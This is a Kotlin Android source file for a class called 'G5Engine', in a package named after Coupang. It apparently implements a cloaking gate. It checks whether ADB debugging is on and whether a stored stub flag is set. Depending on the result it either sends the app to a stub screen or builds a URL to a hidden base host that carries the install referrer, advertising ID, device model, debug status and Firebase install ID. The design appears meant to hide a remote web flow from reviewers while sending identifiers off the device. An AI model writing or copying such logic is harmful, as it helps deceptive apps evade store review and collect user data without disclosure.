package com.coupang.mobile.p.gray5

import android.content.Context
import android.provider.Settings
import com.coupang.mobile.p.screens.isFlowersConnected
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.withContext

internal class G5Engine(
    private val context: Context,
    private val storage: G5Storage,
    private val push: G5Push,
    private val re: G5ReProvider,
    private val ga: G5GaProvider,
    private val dm: G5DmProvider,
    private val router: G5Router
) {
    private val _state = MutableStateFlow<G5State>(G5State.Boot)
    val state: StateFlow<G5State> = _state

    private val linkKey = k("lx5")
    private val stubKey = k("sx5")

    suspend fun start() {
        withContext(Dispatchers.IO) { push.registerDevice() }

        _state.collect { s ->
            when (s) {
                G5State.Boot -> _state.value = G5State.Restoring

                G5State.Restoring -> {
                    val link = storage.get(linkKey)
                    _state.value = if (link != null) G5State.Resolved(link) else G5State.Collecting
                }

                G5State.Collecting -> {
                    val isStub = storage.get(stubKey) == STUB_STORAGE_VALUE_TRUE
                    val adGate = try {
                        Settings.Global.getFloat(context.contentResolver, ADB, 0f)
                    } catch (e: Exception) {
                        1f
                    }.toString().substring(0,1)

                    val hasNet = context.isFlowersConnected()

                    val gate = evaluate(isStub, false, hasNet)
                    val routeKey = gate.routeKey()

                    if (routeKey != null) {
                        _state.value = G5State.Dead(routeKey)
                    } else {
                        val payload = collectPayload(re, ga, dm)
                        val url = G5UrlBuilder("https://$BASE_URL")
                            .param(REF_KEY, payload.ref)
                            .param(GADID_KEY, payload.gad)
                            .param(DEVICE_MODEL_KEY,  payload.dm)
                            .param(ADB_KEY,  adGate)
                            .param(FIREBASE_INSTALL_ID, payload.fid)
                            .build()
                        _state.value = G5State.Resolved(url)
                    }
                }

                is G5State.Resolved -> { /* handled by Gray5 composable */ }

                is G5State.Dead -> {
                    withContext(Dispatchers.Main) { router.dispatch(s.route) }
                }
            }
        }
    }
}
